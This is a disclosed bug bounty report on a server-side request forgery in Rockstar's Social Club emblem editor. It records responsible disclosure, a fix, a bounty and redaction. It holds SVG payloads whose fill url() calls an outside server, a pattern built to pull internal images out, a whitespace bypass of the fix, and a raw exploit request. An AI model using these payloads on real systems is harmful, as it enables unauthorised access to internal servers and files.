{"id":265050,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjUwNTA=","url":"https://hackerone.com/reports/265050","title":"Blind SSRF in emblem editor (2)","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-08-31T19:38:53.911Z","submitted_at":"2017-08-31T19:38:53.911Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"alexbirsan","url":"/alexbirsan","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2143,"url":"https://hackerone.com/rockstargames","handle":"rockstargames","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Rockstar Games","twitter_handle":"RockstarGames","website":"http://www.rockstargames.com/","about":"Publishers of such popular games as Grand Theft Auto, Max Payne, Red Dead Redemption, L.A. Noire, Bully \u0026 more."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-10-28T23:44:08.493Z","bug_reporter_agreed_on_going_public_at":"2017-09-28T23:43:46.817Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nAs per your recommendation in #233301, I'm submitting a PoC for another blind SSRF in the emblem editor.\n\nTo oversight here is allowing absolute `url()` values for the `fill` attribute:\n\n`\u003cpath fill=\"url(https://requestb.in/15rxmgv1#test)\" stroke=\"#a1a1a1\"  ... `\n\nUpon publishing an emblem containing such an element, a HTTP request to the given URL is sent from a Rockstar server. (`███`). The destination port can be easily modified. This doesn't seem to work without including a fragment in the URL (`#test` in the example above).\n\nFurther testing showed that, if a valid SVG is found at the given URL, the `fill` data is actually used in the final image. Fortunately, ████████ doesn't seem to support scripts, although the possibility of finding another way to exfiltrate data doesn't seem that out of reach.\n\nI've attached the full body of the emblem I've used to confirm this bug for ease of reproduction.","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-10-28T23:43:46.917Z","allow_singular_disclosure_after":-124728593.28336097,"singular_disclosure_allowed":true,"vote_count":71,"voters":["pyrrhon","arkaic","jensec","alexbirsan","sp1d3rs","europa","kapytein","inhibitor181","najeh_halawani","bogdantcaciuc","and 61 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":430,"asset_type":"URL","asset_identifier":"socialclub.rockstargames.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1969688,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThank you for your submission. We are investigating your report, and will let you know if we have any questions. We appreciate your assistance and cooperation. \n\nRegards.","automated_response":false,"created_at":"2017-08-31T20:52:29.850Z","updated_at":"2017-08-31T20:52:29.850Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1969789,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi,\n\nI was unable to reproduce the issue and my listener is not getting any response back from Rockstar server. I modified the post data you provided then inserted my own server instead, and I used Netcat for listening but I did not receive any connection. Were you referring to the post request to `/emblems/save`? Can you provide the full HTTP request instead?\n\nRegards.","automated_response":false,"created_at":"2017-08-31T21:44:11.090Z","updated_at":"2017-08-31T21:44:11.090Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1969809,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Sorry for the lack of clarification, I assumed this would be seen by the same person that handled #233301.\n\n`/emblems/save` is indeed the endpoint where you can upload the provided JSON, but you need to call `/emblems/publish` after that to trigger the payload. You'll see the connection a few seconds after that.\n\nAlso, double check that you've added a `#test` after your server's URL. Finally, confirm that both requests actually respond with a success message.","automated_response":false,"created_at":"2017-08-31T21:55:38.865Z","updated_at":"2017-08-31T21:57:15.190Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1969871,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@alexbirsan - Awesome! thank you for the additional information. I was able to replicate the issue and we will escalate the team for further review. We should get back to you as soon as we have an update to share.","automated_response":false,"created_at":"2017-08-31T22:19:49.205Z","updated_at":"2017-08-31T22:19:49.205Z","actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1970863,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, I have an update to share on this one.\n\nI've managed to find a way to retrieve data from Rockstar servers using this vulnerability, more precisely any image with a previously known path. I've chosen the default Windows profile picture as a PoC, which resides in `████████`.\n\nTo display the image on your crew emblem, first, host a SVG that embeds an external image inside a pattern, like this:\n\n~~~\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"\u003e\n\u003cdefs\u003e\n    \u003cpattern id=\"exfil\" width=\"512\" height=\"512\" patternUnits=\"userSpaceOnUse\"\u003e\n        \u003cimage xlink:href=\"█████████\" x=\"0\" y=\"0\" height=\"256px\" width=\"256px\"/\u003e\n    \u003c/pattern\u003e\n\u003c/defs\u003e\n\u003c/svg\u003e\n~~~\n\nAfter uploading the SVG above somewhere on the internet, simply modify the original PoC to link to the pattern:\n\n`\u003cpath fill=\"url(https://yourserver.com/poc.svg#exfil)\" stroke=\"#a1a1a1\" ...`\n\nThis will result in the specified image from the Rockstar sever being shown in your crew emblem after publishing it, as you can see here:\nhttps://prod.cloud.rockstargames.com/crews/sc/8130/32831039/publish/emblems/ca3f8d73b115d482c9a426c84614d371925673bf_512.png\n\nFetching images from other internal hosts using this method should also be possible. In my opinion, this greatly increases the severity of this exploit, because the SSRF is not blind any more, and many local files on the server can be retrieved.\n\nI've also attached the payload I used along with the external SVG above.","automated_response":false,"created_at":"2017-09-01T13:20:01.382Z","updated_at":"2017-09-29T00:10:19.549Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1970900,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @alexbirsan ,\n\nThank you for your report, and thank you very much for continuing to experiment with this and demonstrate how it may be leveraged for data exfiltration! We have notified our developers of the issue and will let you know as soon as we have any updates to share. Thanks again.\n\nRockstar Games Security","automated_response":false,"created_at":"2017-09-01T13:47:16.991Z","updated_at":"2017-09-01T13:47:16.991Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1970977,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is it okay to start working on a detailed write-up for this one for publication after it gets fixed? ","automated_response":false,"created_at":"2017-09-01T14:20:51.144Z","updated_at":"2017-09-01T14:20:51.144Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1970995,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure thing, we just request that you do not publish any details about this exploit until after this report is closed as Resolved. Thanks!","automated_response":false,"created_at":"2017-09-01T14:31:01.556Z","updated_at":"2017-09-01T14:31:01.556Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1970999,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!","automated_response":false,"created_at":"2017-09-01T14:34:21.268Z","updated_at":"2017-09-01T14:34:21.268Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2029952,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @alexbirsan , a fix for this issue should now be live. Can you test this again from your end? Thank you!","automated_response":false,"created_at":"2017-09-28T13:52:02.534Z","updated_at":"2017-09-28T13:52:02.534Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2029957,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @alexbirsan,\n\nWe are scoping this award based on our typical payout for Stored XSS, as we believe the severity is comparable. We have also awarded a bonus due to the great work you put into extending the POC and showing us how it could be further exploited. Thank you.","automated_response":false,"created_at":"2017-09-28T13:54:21.287Z","updated_at":"2017-09-28T13:56:13.262Z","actor":{"url":"/rockstargames","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Rockstar Games"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"250.0","genius_execution_id":null,"team_handle":"rockstargames","collaborator":{"username":"alexbirsan","url":"/alexbirsan"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2030015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm this is fixed on my end.\nI've also tried encoding `http` with XML entities, but I think those are banned altogether. Good call on that!\n\nThank you for the bounty! May I also keep this cool emblem I got using this exploit?\n\n{F224801}","automated_response":false,"created_at":"2017-09-28T14:35:32.911Z","updated_at":"2017-09-28T14:35:32.911Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":224801,"filename":"ingame.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/224/801/257ef27d22a7b3094da52fbcfa12b68d041dbb05/ingame.jpg?response-content-disposition=attachment%3B%20filename%3D%22ingame.jpg%22%3B%20filename%2A%3DUTF-8%27%27ingame.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143340Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c234ce763b9602753072e8884b7eb81430866be6b923280a5467aa5c36aea60f"}],"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2030246,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks @alexbirsan ! And sure, we won't tell anyone about it, but I can't guarantee it won't get picked up by a different team. Thanks again!\n\nRockstar Games Security","automated_response":false,"created_at":"2017-09-28T15:06:45.716Z","updated_at":"2017-09-28T15:06:45.716Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"alexbirsan","url":"/alexbirsan"},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2030259,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's an unpublished draft of the write-up I prepared: ████████\n\nI tried to make it as vague and non-technical as possible, but you're welcome to take a look and see if I left in any sensitive details before I publish it later today.","automated_response":false,"created_at":"2017-09-28T15:14:27.549Z","updated_at":"2017-09-29T00:10:39.335Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2030283,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @alexbirsan , thanks for the link. Apologies for the trouble, but we'd like to review this internally before we give the thumbs-up for this. We really appreciate the responsible disclosure here and your understanding while we read through this!","automated_response":false,"created_at":"2017-09-28T15:33:51.843Z","updated_at":"2017-09-28T15:33:51.843Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2030290,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure thing, sounds reasonable. \n\nIn my opinion, the only remotely sensitive info there is the `nc` screenshot from my server, which I've heavily censored. It only discloses the first byte of a Rockstar IP and the fact that your conversion program is an `exe`. It's no big secret that that particular piece of your infrastructure runs on Windows though.","automated_response":false,"created_at":"2017-09-28T15:38:54.064Z","updated_at":"2017-09-28T15:38:54.064Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2031595,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @alex_birsan,\n \nThanks again for sharing this draft with us. We’re satisfied with the contents of the article; in particular, we really appreciate you proactively censoring the sensitive bits! However, I think we had a bit of a miscommunication previously when you asked about drafting a write-up. We were operating under the assumption that you were talking about making a public disclosure here on HackerOne, via their disclosure process. Our bug bounty program is still maturing, and we’re not yet in a state where we’re comfortable with bugs of this severity being discussed outside the established boundaries of the HackerOne platform. To that end, we kindly ask that you do not post this article directly to ███████. If you’d like, you can feel free to take the contents of your article and post them directly on this report using the “Add Summary” option, and from there we can do a public disclosure through HackerOne. You can then link to this disclosure through whatever media channels you prefer; Twitter, your blog, etc. We are just much more comfortable with the idea of a public disclosure via the established HackerOne process. Thank you for your understanding, and apologies for the inconvenience! We sincerely hope to work with you again here on HackerOne.\n\nRegards,\n\nRockstar Games Security","automated_response":false,"created_at":"2017-09-28T23:27:42.065Z","updated_at":"2017-09-29T00:12:56.080Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2031617,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Eh, I see no point in disclosing it here only, I think it's a boring bug for other security researchers. The interesting part would have been showing less technical people a very enjoyable aspect of bug hunting, having harmless fun with our exploits.\n\nI understand your position on this. Do let me know if you ever become comfortable getting it published though. ","automated_response":false,"created_at":"2017-09-28T23:43:46.851Z","updated_at":"2017-09-28T23:43:46.851Z","first_to_agree":true,"actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2031659,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your understanding @alexbirsan ! We'll disclose this shortly.","automated_response":false,"created_at":"2017-09-29T00:14:35.114Z","updated_at":"2017-09-29T00:14:35.114Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2031911,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I see you're going for full disclosure? In that case, the attachments definitely need to vanish :) ","automated_response":false,"created_at":"2017-09-29T06:08:26.108Z","updated_at":"2017-09-29T06:08:26.108Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2031955,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hold on, I found a bypass for the fix: Inserting some random whitespace around and inside the URL made the exploit work again:\n\n~~~\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"512\" height=\"512\" version=\"1.1\"\u003e\u003cdefs\u003e\u003c/defs\u003e\u003crect x=\"0\" y=\"0\" width=\"512\" height=\"512\" rx=\"0\" ry=\"0\" fill=\"url( \n http://█████/te\nst#123\n)\" fill-opacity=\"1\" stroke-opacity=\"1\" stroke-width=\"0\" stroke-miterlimit=\"10\"\u003e\u003c/rect\u003e\u003c/svg\u003e\n~~~\n\nUsing the payload above, I see an incoming request for `/te%20st` on my server.","automated_response":false,"created_at":"2017-09-29T07:26:57.477Z","updated_at":"2017-09-30T18:34:19.943Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2032649,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @alexbirsan ,\n\nYes, we figured that it'd be a shame to let your hard work go unseen. Thanks for the heads up! We'll hop right on that.\n\nRockstar Games Security","automated_response":false,"created_at":"2017-09-29T13:18:11.025Z","updated_at":"2017-09-29T13:18:11.025Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2035566,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Meanwhile, could you please censor the string \"██████████\"? Also, you might want to remove \"██████\" too.","automated_response":false,"created_at":"2017-09-30T11:41:22.779Z","updated_at":"2017-10-02T13:50:58.478Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2037868,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @alexbirsan No problem! Let us know if there's anything else on your end that you'd like us to redact.","automated_response":false,"created_at":"2017-10-02T13:49:17.813Z","updated_at":"2017-10-02T13:49:17.813Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2043868,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @alexbirsan ,\n\nCan you please share the svgData you used for the whitespace bypass? Our devs would like to see it and I want to make sure I'm getting them a clean example of it. Thank you!\n\nRockstar Games Security","automated_response":false,"created_at":"2017-10-04T17:54:33.616Z","updated_at":"2017-10-04T17:54:33.616Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2043947,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure thing! Here's the raw request I used to reproduce the exploit just now:\n\n~~~\nPOST https://socialclub.rockstargames.com/emblems/save HTTP/1.1\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\nOrigin: https://socialclub.rockstargames.com\nHost: socialclub.rockstargames.com\nCookie: \u003cREDACTED\u003e\nReferer: https://socialclub.rockstargames.com/emblems/edit/QT68NL6f\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json\nRequestVerificationToken: h6O-_HDNgAKKDe-jDxZBRZsKz3rmcXAQw48fJVVAOTdR_VR6hRTLSsu-My5CDJ6zmeXkLAtsCKap3WbMtm7z5kEH7WY1\nContent-Length: 1087\n\n{\"emblemId\": \"4YldoM0O\", \"hash\": \"32fd3fd9a0f04b6cd5048594c9d266a9acf1aa38\", \"svgData\": \"████████\", \"layerData\": \"W3siaWQiOiJiYWNrZ3JvdW5kIiwibmFtZSI6IkJhY2tncm91bmQiLCJ0eXBlIjoic3F1YXJlIiwieSI6MCwieCI6MCwKInNjYWxlWSI6MTAwLCJzY2FsZVgiOjEwMCwiaW52ZXJ0ZWRZIjpmYWxzZSwiaW52ZXJ0ZWRYIjpmYWxzZSwicm90YXRpb24iOjAsIm9wYWNpdHkiOjEwLAoiaW5kZXgiOjAsImNvbG9yIjoidXJsKHRlc2luZykiLCJpc0ZpbGxlZCI6dHJ1ZSwiaW50ZXJuYWwiOnRydWUsImxvY2tlZCI6ZmFsc2UsInRCb2xkIjpmYWxzZSwKInRJdGFsaWMiOmZhbHNlLCJmb250RmFtaWx5IjpudWxsLCJib3JkZXJDb2xvciI6InVybCh0ZXN0aW5nKSIsImJvcmRlclNpemUiOjEsImdyYWRpZW50U3R5bGUiOiJCb3RoIiwKInNsdWciOiJyZWN0YW5nbGVzL3NxdWFyZSIsIndpZHRoIjo1MTIsImhlaWdodCI6NTEyLCAidGVzdCI6IjEyMyJ9XQ==\", \"parentId\": \"\", \"crewId\": \"0\"}\n~~~\n\nAnd after hitting `/emblems/publish`, I see this:\n\n~~~\n███ - - [04/Oct/2017 20:24:33] \"GET /te%20st HTTP/1.1\" 404 -\n~~~\n\nLet me know if you need more info.\n\nPS: This smells like a regex issue, am I right about that? 